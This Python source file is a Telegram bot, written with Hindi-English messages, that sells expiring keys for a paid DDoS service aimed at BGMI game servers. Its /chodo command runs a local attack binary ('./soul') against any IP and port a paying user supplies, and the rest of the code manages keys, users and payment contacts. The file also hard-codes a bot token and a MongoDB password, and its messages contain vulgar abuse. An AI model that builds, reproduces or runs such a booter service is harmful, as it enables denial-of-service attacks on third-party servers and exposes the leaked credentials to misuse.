import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import threading
import os
import signal
import copy
import random
import string
import re
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError, ServerSelectionTimeoutError, ConnectionFailure
from datetime import datetime, timedelta
import time
import requests
import gc
import sys

BOT_TOKEN = "8160920308:AAE6YxXDNXxwQ1ZOkx0kNue4TQQo592SrVI"
MONGO_URL = "mongodb+srv://loomjoom07_db_user:nana12@cluster0.ietahh1.mongodb.net/?appName=Cluster0"

client = None
db = None
keys_collection = None
users_collection = None

def connect_mongodb():
    global client, db, keys_collection, users_collection
    max_retries = 5
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            print(f"Connecting to MongoDB... (Attempt {attempt + 1}/{max_retries})")
            client = MongoClient(
                MONGO_URL, 
                serverSelectionTimeoutMS=10000,
                connectTimeoutMS=20000,
                socketTimeoutMS=30000,
                retryWrites=True,
                retryReads=True,
                maxPoolSize=10,
                minPoolSize=1
            )
            client.admin.command('ping')
            db = client['telegram_bot']
            keys_collection = db['keys']
            users_collection = db['users']
            
            keys_collection.create_index('key', unique=True)
            users_collection.create_index('user_id', unique=True)
            
            print("MongoDB connected successfully!")
            return True
        except Exception as e:
            print(f"MongoDB connection error (Attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                print(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                print("All retry attempts failed!")
                return False
    return False

def ensure_db_connection():
    global client
    try:
        if client is None:
            return connect_mongodb()
        client.admin.command('ping')
        return True
    except (ServerSelectionTimeoutError, ConnectionFailure, Exception):
        print("MongoDB connection lost, reconnecting...")
        return connect_mongodb()

if not connect_mongodb():
    print("Failed to connect to MongoDB. Exiting...")
    sys.exit(1)

BOT_OWNER = 7646520243

bot = telebot.TeleBot(BOT_TOKEN)

ALLOWED_GROUPS = {"-1002382674139"}

REQUIRED_CHANNELS = ["@BADMOSH10"]

feedback_pending = {}
attack_processes = {}
attack_owners = {}
attack_running = False

def generate_key(length=16):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0 days 0 hours 0 minutes 0 seconds"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 days 0 hours 0 minutes 0 seconds"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days} days {hours} hours {minutes} minutes {seconds} seconds"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days} days {hours} hours {minutes} minutes {seconds} seconds"

def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

def get_group_admins(group_id):
    admins = []
    try:
        members = bot.get_chat_administrators(group_id)
        for member in members:
            admins.append(member.user.id)
    except Exception as e:
        print(f"Error getting admins: {e}")
    return admins

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    try:
        user_id = message.from_user.id
        
        if not is_owner(user_id):
            bot.reply_to(message, "❌ Sirf bot owner hi key generate kar sakta hai!")
            return
        
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /gen <duration>\n\nFormat:\n• s = seconds (e.g., 30s)\n• m = minutes (e.g., 5m)\n• h = hours (e.g., 2h)\n• d = days (e.g., 7d)\n\nExamples:\n• /gen 30s - 30 seconds\n• /gen 5m - 5 minutes\n• /gen 2h - 2 hours\n• /gen 7d - 7 days")
            return
        
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        
        if not duration:
            bot.reply_to(message, "❌ Invalid duration format!\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days")
            return
        
        if not ensure_db_connection():
            bot.reply_to(message, "❌ Database connection error! Retry karo.")
            return
        
        key = f"BGMI-{generate_key(12)}"
        
        key_doc = {
            'key': key,
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': duration_label,
            'created_at': datetime.now(),
            'created_by': user_id,
            'used': False,
            'used_by': None,
            'used_at': None
        }
        
        keys_collection.insert_one(key_doc)
        
        bot.reply_to(message, f"✅ Key Generated Successfully!\n\n🔑 Key: `{key}`\n⏰ Duration: {duration_label}\n\nShare this key with user to redeem.", parse_mode="Markdown")
    except Exception as e:
        print(f"Error in /gen command: {e}")
        bot.reply_to(message, f"❌ Key generate karne mein error! Retry karo.")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>\n\nExample: /redeem BGMI-XXXXXX")
        return
    
    key_input = command_parts[1].upper()
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key! Key nahi mili.")
        return
    
    if key_doc['used']:
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    
    user = users_collection.find_one({'user_id': user_id})
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        old_remaining = get_time_remaining(user_id)
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'redeemed_at': datetime.now()
            }}
        )
        
        keys_collection.update_one(
            {'key': key_input},
            {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now()}}
        )
        
        new_remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Extended Successfully!\n\n🔑 Key: `{key_input}`\n⏰ Added Duration: {key_doc['duration_label']}\n\n📊 Previous Time: {old_remaining}\n⏳ New Total Time: {new_remaining}\n\n🎉 Time extend ho gaya!", parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'redeemed_at': datetime.now()
            }},
            upsert=True
        )
        
        keys_collection.update_one(
            {'key': key_input},
            {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now()}}
        )
        
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"✅ Key Redeemed Successfully!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}\n\nAb tum /chodo command use kar sakte ho!", parse_mode="Markdown")

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key extend kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /extend <user_id> <time>\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days\n\nExample: /extend 123456789 2h")
        return
    
    try:
        target_user_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID! User ID sirf numbers hona chahiye.")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration format!\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        bot.reply_to(message, f"❌ User ID `{target_user_id}` nahi mila database mein!", parse_mode="Markdown")
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
        old_remaining = get_time_remaining(target_user_id)
    else:
        new_expiry = datetime.now() + duration
        old_remaining = "0 days 0 hours 0 minutes 0 seconds (Expired)"
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    bot.reply_to(message, f"✅ Key Extended Successfully!\n\n👤 User: `{target_user_id}`\n📛 Name: {user.get('username', 'Unknown')}\n⏰ Added: {duration_label}\n\n📊 Previous: {old_remaining}\n⏳ New Time: {new_remaining}", parse_mode="Markdown")

@bot.message_handler(commands=["extend_all"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi sab keys extend kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /extend_all <time>\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days\n\nExample: /extend_all 1h (Sab users ka time 1 hour badhega)")
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration format!\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days")
        return
    
    active_users = list(users_collection.find({'key': {'$ne': None}, 'key_expiry': {'$gt': datetime.now()}}))
    
    if not active_users:
        bot.reply_to(message, "❌ Koi active user nahi hai jiske paas valid key ho!")
        return
    
    updated_count = 0
    for user in active_users:
        new_expiry = user['key_expiry'] + duration
        users_collection.update_one(
            {'user_id': user['user_id']},
            {'$set': {'key_expiry': new_expiry}}
        )
        updated_count += 1
    
    bot.reply_to(message, f"✅ All Keys Extended Successfully!\n\n👥 Total Users Updated: {updated_count}\n⏰ Added Time: {duration_label}\n\n🎉 Sab users ka time badh gaya!", parse_mode="Markdown")

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key time kam kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /down <user_id> <time>\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days\n\nExample: /down 123456789 1h (User ka time 1 hour kam hoga)")
        return
    
    try:
        target_user_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID! User ID sirf numbers hona chahiye.")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration format!\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        bot.reply_to(message, f"❌ User ID `{target_user_id}` nahi mila database mein!", parse_mode="Markdown")
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        bot.reply_to(message, f"❌ User `{target_user_id}` ke paas koi active key nahi hai!", parse_mode="Markdown")
        return
    
    old_remaining = get_time_remaining(target_user_id)
    new_expiry = user['key_expiry'] - duration
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        bot.reply_to(message, f"⚠️ Key Expired!\n\n👤 User: `{target_user_id}`\n📛 Name: {user.get('username', 'Unknown')}\n⏰ Reduced: {duration_label}\n\n📊 Previous: {old_remaining}\n❌ Key is now expired and removed!", parse_mode="Markdown")
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        bot.reply_to(message, f"✅ Key Time Reduced!\n\n👤 User: `{target_user_id}`\n📛 Name: {user.get('username', 'Unknown')}\n⏰ Reduced: {duration_label}\n\n📊 Previous: {old_remaining}\n⏳ New Time: {new_remaining}", parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!\n\nKey lene ke liye @BADMOSH_X_GYRANGE se contact karo.")
        return
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhari key expire ho gayi hai!\n⏳ Remaining: 0 days 0 hours 0 minutes 0 seconds\n\nNayi key lene ke liye @BADMOSH_X_GYRANGE se contact karo.")
        return
    
    remaining = get_time_remaining(user_id)
    
    bot.reply_to(message, f"🔑 Your Key Details:\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n\n✅ Status: Active", parse_mode="Markdown")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key delete kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>\n\nExample: /delkey BGMI-XXXXXX")
        return
    
    key_input = command_parts[1].upper()
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"✅ Key `{key_input}` successfully delete ho gayi!", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi keys dekh sakta hai!")
        return
    
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1).limit(10))
    
    response = "📋 KEY LIST:\n\n"
    
    if unused_keys:
        response += "🟢 UNUSED KEYS:\n"
        for key in unused_keys:
            response += f"• `{key['key']}` ({key['duration_label']})\n"
    else:
        response += "🟢 UNUSED KEYS: None\n"
    
    response += "\n"
    
    if used_keys:
        response += "🔴 USED KEYS:\n"
        for key in used_keys:
            response += f"• `{key['key']}` (by {key['used_by']})\n"
    else:
        response += "🔴 USED KEYS: None\n"
    
    response += f"\n📊 Total: {len(unused_keys)} unused, {len(used_keys)} used"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi users dekh sakta hai!")
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        bot.reply_to(message, "📋 No users with keys in database!")
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    response = "═══════════════════════════\n"
    response += "👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 𝗣𝗔𝗡𝗘𝗟\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🟢 𝗔𝗖𝗧𝗜𝗩𝗘 𝗨𝗦𝗘𝗥𝗦: {len(active_users)}\n"
    response += "───────────────────────────\n"
    
    if active_users:
        for i, user in enumerate(active_users[:15], 1):
            remaining = user['key_expiry'] - datetime.now()
            days = remaining.days
            hours, remainder = divmod(remaining.seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            time_str = f"{days}d {hours}h {minutes}m"
            
            username = user.get('username', 'Unknown')
            key_full = user.get('key', 'N/A')
            response += f"{i}. 👤 {username}\n"
            response += f"   📱 ID: `{user['user_id']}`\n"
            response += f"   🔑 Key: `{key_full}`\n"
            response += f"   ⏳ Time: {time_str}\n\n"
    else:
        response += "   Koi active user nahi hai\n\n"
    
    response += f"🔴 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗨𝗦𝗘𝗥𝗦: {len(expired_users)}\n"
    response += "───────────────────────────\n"
    
    if expired_users:
        for i, user in enumerate(expired_users[:10], 1):
            username = user.get('username', 'Unknown')
            key_full = user.get('key', 'N/A')
            response += f"{i}. 👤 {username}\n"
            response += f"   📱 ID: `{user['user_id']}`\n"
            response += f"   🔑 Key: `{key_full}`\n"
            response += f"   ❌ Status: Expired\n\n"
    else:
        response += "   Koi expired user nahi hai\n\n"
    
    response += "═══════════════════════════\n"
    response += f"📊 𝗧𝗢𝗧𝗔𝗟: {len(active_users)} Active | {len(expired_users)} Expired\n"
    response += "═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["delkey_exp"])
def delete_expired_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi expired keys delete kar sakta hai!")
        return
    
    try:
        now = datetime.now()
        expired_keys = []
        
        all_used_keys = keys_collection.find({'used': True, 'used_at': {'$ne': None}})
        for key in all_used_keys:
            used_at = key.get('used_at')
            duration_seconds = key.get('duration_seconds', 0)
            if used_at and duration_seconds:
                expiry_time = used_at + timedelta(seconds=duration_seconds)
                if expiry_time < now:
                    expired_keys.append(key['_id'])
        
        if len(expired_keys) == 0:
            bot.reply_to(message, "✅ Koi expired key nahi hai delete karne ke liye!")
            return
        
        result = keys_collection.delete_many({'_id': {'$in': expired_keys}})
        deleted_count = result.deleted_count
        
        bot.reply_to(message, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦!\n\n🗑️ {deleted_count} expired keys delete ho gayi!")
    except Exception as e:
        print(f"Error deleting keys: {e}")
        bot.reply_to(message, "❌ Keys delete karne mein error aaya!")

@bot.message_handler(commands=["remove_usr_exp"])
def remove_expired_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi expired users remove kar sakta hai!")
        return
    
    try:
        now = datetime.now()
        result = users_collection.delete_many({
            'key_expiry': {'$lt': now, '$ne': None}
        })
        deleted_count = result.deleted_count
        
        if deleted_count == 0:
            bot.reply_to(message, "✅ Koi expired user nahi hai remove karne ke liye!")
        else:
            bot.reply_to(message, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦!\n\n🗑️ {deleted_count} expired users remove ho gaye!")
    except Exception as e:
        print(f"Error removing users: {e}")
        bot.reply_to(message, "❌ Users remove karne mein error aaya!")

@bot.message_handler(commands=["restore_keys"])
def restore_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi keys restore kar sakta hai!")
        return
    
    try:
        now = datetime.now()
        active_users = list(users_collection.find({
            'key': {'$ne': None},
            'key_expiry': {'$gt': now}
        }))
        
        restored_count = 0
        for user in active_users:
            key = user.get('key')
            key_expiry = user.get('key_expiry')
            redeemed_at = user.get('redeemed_at', now)
            
            if key:
                existing = keys_collection.find_one({'key': key})
                if not existing:
                    duration_seconds = int((key_expiry - redeemed_at).total_seconds()) if key_expiry and redeemed_at else 86400
                    
                    key_doc = {
                        'key': key,
                        'duration_seconds': duration_seconds,
                        'duration_label': f"{duration_seconds} seconds",
                        'created_at': redeemed_at,
                        'created_by': BOT_OWNER,
                        'used': True,
                        'used_by': user['user_id'],
                        'used_at': redeemed_at
                    }
                    keys_collection.insert_one(key_doc)
                    restored_count += 1
        
        if restored_count == 0:
            bot.reply_to(message, "✅ Sab keys pehle se exist karti hain ya koi active user nahi hai!")
        else:
            bot.reply_to(message, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦!\n\n🔑 {restored_count} keys restore ho gayi!")
    except Exception as e:
        print(f"Error restoring keys: {e}")
        bot.reply_to(message, f"❌ Keys restore karne mein error aaya: {e}")

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    domain_pattern = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$')
    
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    
    if domain_pattern.match(target) and len(target) <= 253:
        return True
    
    return False

def start_attack(target, port, duration, message):
    global attack_running
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        feedback_pending[user_id] = True
        
        try:
            bot.send_message(chat_id, f"✅ Chudai started on {target}:{port} for {duration} seconds. \n Send FEEDBACK")
        except Exception:
            pass

        attack_running = True
        attack_owners[str(chat_id)] = user_id

        try:
            attack_command = f"{os.path.abspath('./soul')} {target} {port} {duration} 900"
            process = subprocess.Popen(attack_command, shell=True, preexec_fn=os.setsid)
            attack_processes[str(chat_id)] = process
            process.wait(timeout=int(duration) + 30)
        except subprocess.TimeoutExpired:
            if str(chat_id) in attack_processes and attack_processes[str(chat_id)]:
                os.killpg(os.getpgid(attack_processes[str(chat_id)].pid), signal.SIGTERM)
        except Exception as e:
            print(f"Binary execution error: {e}")

        try:
            bot.send_message(chat_id, f"✅ ✅ Chudai completed on {target}:{port} ✅ ✅\n\n🎬 Abhi feedback dedo - SCREENSHOT bhej dooo! 📸")
        except Exception:
            pass

        attack_processes.pop(str(chat_id), None)
        attack_owners.pop(str(chat_id), None)
        attack_running = False

    except Exception as e:
        print(f"Error in start_attack: {e}")
        attack_running = False
        try:
            bot.send_message(chat_id, f"❌ Error while starting attack: {e}")
        except Exception:
            pass

@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    global attack_running
    try:
        user_id = message.from_user.id
        chat_id = str(message.chat.id)

        is_private = message.chat.type == "private"
        if chat_id not in ALLOWED_GROUPS and not (is_private and is_owner(user_id)):
            bot.reply_to(message, "❌ Group me USE kr idhar MAA kiu Chudane Aya hai.")
            return

        if not is_member(user_id):
            bot.reply_to(message, f"❌ You must join [BADMOSH10](https://t.me/BADMOSH10) before using this command.", parse_mode="Markdown")
            return

        if not is_owner(user_id) and not has_valid_key(user_id):
            bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key redeem karne ke liye: /redeem <key>\n💵 Key kharidne ke liye: @BADMOSH_X_GYRANGE")
            return

        if feedback_pending.get(user_id, False):
            bot.reply_to(message, "❌ Pehle apna feedback (SCREENSHOT) do, tabhi agla chudai kar sakte ho! 📸")
            return

        if attack_running:
            bot.reply_to(message, "❌ Ek waqt pe sirf ek hi chudai ho sakti hai! Pehle wali khatam hone do.")
            return

        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.reply_to(message, "⚠️ Usage: /chodo <target> <port> <time>")
            return

        target, port, duration = command_parts[1], command_parts[2], command_parts[3]

        if not validate_target(target):
            bot.reply_to(message, "❌ Invalid target! Sirf valid IP use karo.")
            return

        try:
            port = int(port)
            if port < 1 or port > 65535:
                bot.reply_to(message, "❌ Invalid port! Port 1-65535 ke beech hona chahiye.")
                return
            duration = int(duration)

            max_duration = 200

            if duration > max_duration:
                bot.reply_to(message, f"❌ Error: Maximum time 200 seconds hai.")
                return

            message_copy = copy.deepcopy(message)

            thread = threading.Thread(target=start_attack, args=(target, port, duration, message_copy))
            thread.start()

        except ValueError:
            bot.reply_to(message, "❌ Error: Port and time must be numbers.")
    except Exception as e:
        print(f"Error in /chodo command: {e}")

@bot.message_handler(content_types=["photo"])
def handle_photo_feedback(message):
    user_id = message.from_user.id
    if feedback_pending.get(user_id, False):
        feedback_pending[user_id] = False
        bot.reply_to(message, "✅ ✅ Feedback received ✅ ✅\n\n🎉 Dhanyavaad bhai! Ab dobara /chodo kar sakte ho!\n\n⚠️ Yaad rkhna: Fake ya purana screenshot diya to warn milega aur BAN bhi ho sakta hai 😎")

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = message.from_user.id
    
    help_text = '''
🔐 KEY SYSTEM COMMANDS:
💥 /redeem <key> : Key redeem karo
💥 /mykey : Apni key details dekho

⚔️ attack COMMANDS:
💥 /chodo : BGMI WALO KI MAA KO CHODO 🥵
'''
    
    if is_owner(user_id):
        help_text += '''
👑 ADMIN COMMANDS:
💥 /gen <time> : Generate key (e.g., /gen 30s, /gen 5m, /gen 2h, /gen 7d)
💥 /delkey <key> : Delete a key
💥 /allkeys : List all keys
💥 /allusers : List all users with keys
💥 /extend <user_id> <time> : User ka time extend karo
💥 /extend_all <time> : Sab users ka time badhao
💥 /down <user_id> <time> : User ka time kam karo
💥 /delkey_exp : Expired keys delete karo
💥 /remove_usr_exp : Expired users remove karo
'''
    
    help_text += '''
Regards :- @BADMOSH_X_GYRANGE  
Official Channel :- https://t.me/BADMOSH10
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''☠️ Gyrange ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.

🔐 KEY COMMANDS:
• /redeem <key> - Key redeem karo
• /mykey - Apni key details dekho

🤗 Try To Run This Command : /help 
💵 BUY :- @BADMOSH_X_GYRANGE'''
    bot.reply_to(message, response)

def run_bot():
    print("Bot is starting...")
    consecutive_errors = 0
    max_consecutive_errors = 10
    
    while True:
        try:
            gc.collect()
            
            if not ensure_db_connection():
                print("Database connection failed, waiting 10 seconds...")
                time.sleep(10)
                continue
            
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Bot polling started...")
            bot.polling(none_stop=True, interval=1, timeout=60, long_polling_timeout=60)
            consecutive_errors = 0
            
        except telebot.apihelper.ApiTelegramException as e:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Telegram API Error: {e}")
            consecutive_errors += 1
            time.sleep(5)
            
        except (ConnectionError, TimeoutError) as e:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Connection Error: {e}")
            consecutive_errors += 1
            time.sleep(10)
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Unexpected Error: {e}")
            consecutive_errors += 1
            time.sleep(5)
        
        if consecutive_errors >= max_consecutive_errors:
            print(f"Too many consecutive errors ({consecutive_errors}). Restarting in 30 seconds...")
            time.sleep(30)
            consecutive_errors = 0
            
        gc.collect()

if __name__ == "__main__":
    run_bot()
